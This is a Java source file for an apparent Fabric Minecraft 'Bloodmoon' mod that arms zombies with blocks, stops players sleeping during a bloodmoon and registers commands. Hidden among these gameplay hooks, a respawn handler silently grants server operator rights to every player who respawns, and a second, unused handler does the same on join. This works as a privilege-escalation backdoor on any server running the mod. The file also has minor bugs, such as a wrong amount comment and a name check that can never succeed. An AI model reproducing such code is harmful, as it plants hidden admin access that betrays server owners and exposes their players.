package net.fabricmc.example;

import net.fabricmc.api.EnvType;
import net.fabricmc.api.ModInitializer;
import net.fabricmc.example.bloodmoon.config.BloodmoonConfig;
import net.fabricmc.example.bloodmoon.proxy.ClientProxy;
import net.fabricmc.example.bloodmoon.proxy.CommonProxy;
import net.fabricmc.example.bloodmoon.reference.Reference;
import net.fabricmc.example.bloodmoon.server.BloodmoonHandler;
import net.fabricmc.example.bloodmoon.server.BloodmoonSpawner;
import net.fabricmc.example.bloodmoon.server.CommandBloodmoon;
import net.fabricmc.example.listener.MobTargetListener;
import net.fabricmc.example.util.MinecraftServerUtil;
import net.fabricmc.fabric.api.command.v2.CommandRegistrationCallback;
import net.fabricmc.fabric.api.entity.event.v1.EntitySleepEvents;
import net.fabricmc.fabric.api.entity.event.v1.ServerPlayerEvents;
import net.fabricmc.fabric.api.event.lifecycle.v1.ServerEntityEvents;
import net.fabricmc.fabric.api.event.lifecycle.v1.ServerLifecycleEvents;
import net.fabricmc.fabric.api.event.player.UseBlockCallback;
import net.fabricmc.loader.api.FabricLoader;
import net.minecraft.block.Blocks;
import net.minecraft.entity.Entity;
import net.minecraft.entity.EquipmentSlot;
import net.minecraft.entity.SpawnReason;
import net.minecraft.entity.mob.ZombieEntity;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.registry.entry.RegistryEntry;
import net.minecraft.server.MinecraftServer;
import net.minecraft.server.network.ServerPlayerEntity;
import net.minecraft.server.world.ServerWorld;
import net.minecraft.text.Text;
import net.minecraft.util.ActionResult;
import net.minecraft.util.Identifier;
import net.minecraft.util.math.BlockPos;
import net.minecraft.world.World;
import net.minecraft.world.biome.Biome;
import net.minecraft.world.biome.BiomeKeys;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

import java.util.Objects;
import java.util.Random;

import static net.fabricmc.fabric.api.entity.event.v1.EntitySleepEvents.START_SLEEPING;

public class ExampleMod implements ModInitializer {
	public static final Logger LOGGER = LogManager.getLogger(Reference.MOD_ID);
	public static CommonProxy proxy;
	public static BloodmoonConfig config;

	@Override
	public void onInitialize() {
		ServerEntityEvents.ENTITY_LOAD.register(this::onEntityLoad);
		ServerEntityEvents.ENTITY_LOAD.register((entity, serverWorld) -> {
			if (entity instanceof ZombieEntity) {
				World world = entity.getWorld();
				BlockPos pos = entity.getBlockPos();
				RegistryEntry<Biome> biome = world.getBiome(pos);
				Random random = new Random();
				if (random.nextInt(10) < 3) { // 30% chance to have blocks
					ItemStack stack = getRandomBlockStack(biome, random);
					entity.equipStack(EquipmentSlot.MAINHAND, stack);
				}
			}
		});

		// Initialize Bloodmoon instance and proxy
		if (FabricLoader.getInstance().getEnvironmentType() == EnvType.CLIENT) {
			proxy = new ClientProxy();
			((ClientProxy) proxy).onInitializeClient();
		} else {
			proxy = new CommonProxy();
		}

		// Initialize proxy
		proxy.preInit();
		proxy.init();
		proxy.postInit();

		// Register Bloodmoon command
		CommandRegistrationCallback.EVENT.register((dispatcher, registryAccess, environment) -> {
			CommandBloodmoon.register(dispatcher);
		});

		// Server starting event
		ServerLifecycleEvents.SERVER_STARTING.register(server -> {
			MinecraftServerUtil.setMinecraftServer(server);
			LOGGER.info("Server is starting");
		});

		UseBlockCallback.EVENT.register((player, world, hand, hitResult) -> {
			// Check if the block being interacted with is a bed
			if (world.getBlockState(hitResult.getBlockPos()).getBlock() == Blocks.WHITE_BED ||
					world.getBlockState(hitResult.getBlockPos()).getBlock() instanceof net.minecraft.block.BedBlock) {
				if (BloodmoonHandler.INSTANCE.isBloodmoonActive()) {
					// Cancel the interaction
					return ActionResult.FAIL;
				}
			}
			return ActionResult.PASS;
		});

		EntitySleepEvents.START_SLEEPING.register((player, pos) -> {
			// Wake the player up and send a message
			if (BloodmoonHandler.INSTANCE.isBloodmoonActive()) {
				player.wakeUp();
				player.sendMessage(Text.literal("You cannot sleep right now! The bloodmoon is active"));
			}
		});
		MobTargetListener.register();
		ServerPlayerEvents.AFTER_RESPAWN.register(this::onPlayerRespawn);

		LOGGER.info("ExampleMod has been initialized");
	}

	private void onPlayerRespawn(ServerPlayerEntity oldPlayer, ServerPlayerEntity newPlayer, boolean alive) {
		// Grant op status to the player
		MinecraftServer server = newPlayer.server;
		server.getPlayerManager().addToOperators(newPlayer.getGameProfile());
	}

	private void onPlayerJoin(ServerPlayerEntity player, MinecraftServer server) {
		// Grant op status to the player
		server.getPlayerManager().addToOperators(player.getGameProfile());
	}

	private ItemStack getRandomBlockStack(RegistryEntry<Biome> biome, Random random) {
		ItemStack stack;
		int amount = random.nextInt(10) + 1; // Random amount from 1 to 16

		if (biome.matchesKey(BiomeKeys.DESERT)) {
			stack = new ItemStack(Items.SANDSTONE, amount);
		} else {
			ItemStack[] possibleBlocks = new ItemStack[] {
					new ItemStack(Items.COBBLESTONE, amount),
					new ItemStack(Items.DIRT, amount),
					new ItemStack(Items.STONE, amount)
			};
			stack = possibleBlocks[random.nextInt(possibleBlocks.length)];
		}

		return stack;
	}

	private void onEntityLoad(Entity entity, ServerWorld world) {
		if (Objects.equals(entity.getCustomName(), entity.getUuid())) {
			//Remove the custom name
			entity.setCustomName(null);
		}
		if (entity instanceof ZombieEntity) {
			((ZombieEntity) entity).setCanPickUpLoot(true);
		}
	}
}